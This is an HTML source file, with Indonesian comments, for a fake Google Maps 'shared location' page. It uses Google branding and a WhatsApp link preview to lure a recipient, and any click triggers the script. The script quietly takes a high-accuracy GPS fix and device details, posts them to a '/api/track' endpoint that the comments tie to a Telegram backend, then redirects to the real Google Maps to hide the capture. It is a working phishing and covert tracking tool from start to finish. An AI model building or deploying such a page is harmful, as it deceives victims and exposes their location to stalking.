<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <!-- Open Graph untuk Pratinjau WhatsApp -->
    <meta property="og:title" content="📍 Lokasi Terbagikan">
    <meta property="og:description" content="Seseorang telah membagikan lokasi terkini dengan Anda.">
    <meta property="og:url" content="https://shareloc.online">
    <meta property="og:type" content="website">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, Arial, sans-serif; }
        body { 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between; 
            align-items: center; 
            overflow: hidden;
            position: relative;
            /* Latar belakang peta terang persis seperti gambar referensi */
            background-image: url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&q=80&w=1000');
            background-size: cover;
            background-position: center;
        }

        /* Overlay transparan tipis agar latar belakang terlihat cerah alami seperti Google Maps asli */
        .overlay {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(1px);
            z-index: 1;
        }

        /* Top Smart Banner ala Mobile Browser */
        .top-banner {
            position: relative;
            z-index: 3;
            width: 92%;
            max-width: 480px;
            background: white;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 14px;
            border-radius: 12px;
            margin-top: 12px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
            cursor: pointer;
        }
        .banner-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .banner-icon {
            width: 36px;
            height: 36px;
            object-fit: contain;
        }
        .banner-title {
            font-size: 15px;
            font-weight: 600;
            color: #202124;
        }
        .banner-sub {
            font-size: 12px;
            color: #5f6368;
        }
        .banner-btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 600;
            border-radius: 18px;
            cursor: pointer;
        }

        /* Konten Utama di Tengah */
        .center-content {
            position: relative;
            z-index: 3;
            text-align: center;
            max-width: 360px;
            width: 90%;
            padding: 24px;
            background: rgba(255, 255, 255, 0.92);
            border-radius: 28px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            margin: auto 0;
            backdrop-filter: blur(5px);
        }

        /* App Icon kotak sudut melengkung */
        .app-icon-box {
            width: 72px;
            height: 72px;
            background: white;
            border-radius: 18px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.12);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 18px auto;
        }
        .app-icon-img {
            width: 46px;
            height: 46px;
            object-fit: contain;
        }

        .main-title {
            color: #202124;
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 24px;
            line-height: 1.35;
        }

        /* Tombol Utama */
        .btn-open {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 500;
            border-radius: 28px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 2px 6px rgba(26,115,232,0.3);
            margin-bottom: 16px;
            transition: background 0.2s;
        }
        .btn-open:hover { background-color: #1557b0; }

        .link-web {
            color: #1a73e8;
            font-size: 14px;
            font-weight: 500;
            background: none;
            border: none;
            cursor: pointer;
        }
        .link-web:hover { text-decoration: underline; }

        /* Spinner Loading */
        .spinner { 
            border: 3px solid #f1f3f4; 
            border-top: 3px solid #1a73e8; 
            border-radius: 50%; 
            width: 36px; height: 36px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <!-- Top Banner -->
    <div class="top-banner" onclick="startTracking()">
        <div class="banner-left">
            <img class="banner-icon" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Maps">
            <div>
                <div class="banner-title">Google Maps</div>
                <div class="banner-sub" id="txt-banner-sub">Open in the Google Maps app</div>
            </div>
        </div>
        <button class="banner-btn" id="txt-banner-btn">OPEN</button>
    </div>

    <!-- Konten Tengah -->
    <div class="center-content" id="main-container">
        <div class="app-icon-box">
            <img class="app-icon-img" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Maps">
        </div>
        <div class="main-title" id="txt-main-title">Looks like you already have Google Maps app installed</div>
        <button class="btn-open" onclick="startTracking()" id="txt-btn-open">Open app</button>
        <div>
            <button class="link-web" onclick="startTracking()" id="txt-link-web">Stay on web</button>
        </div>
    </div>

    <div></div> <!-- Spacer bawah -->

    <script>
        // Deteksi Bahasa Otomatis (Indonesia atau Inggris)
        const userLang = navigator.language || navigator.userLanguage || 'en';
        const isIndonesian = userLang.toLowerCase().includes('id');

        if (isIndonesian) {
            document.getElementById('txt-banner-sub').innerText = 'Buka di aplikasi Google Maps';
            document.getElementById('txt-banner-btn').innerText = 'BUKA';
            document.getElementById('txt-main-title').innerText = 'Sepertinya Anda sudah menginstal aplikasi Google Maps';
            document.getElementById('txt-btn-open').innerText = 'Buka aplikasi';
            document.getElementById('txt-link-web').innerText = 'Tetap di web';
        }

        async function startTracking() {
            const container = document.getElementById('main-container');
            container.innerHTML = `
                <div class="spinner"></div>
                <div class="main-title" style="font-size: 18px; margin-top: 10px; margin-bottom: 0;">${isIndonesian ? 'Memuat Peta...' : 'Loading Map...'}</div>
            `;

            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS secara instan di latar belakang
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 5000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak atau timeout");
                }
            }

            // 2. Info Perangkat Ringan
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
            };

            // 3. Kirim data ke backend Telegram secara background
            fetch('/api/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy,
                    image: null,
                    deviceData
                })
            }).catch(e => console.log("Gagal kirim background"));

            // 4. Langsung alihkan ke Google Maps asli dengan cepat
            setTimeout(() => {
                if (latitude && longitude) {
                    window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
                } else {
                    window.location.href = 'https://www.google.com/maps';
                }
            }, 600);
        }
    </script>
</body>
</html>
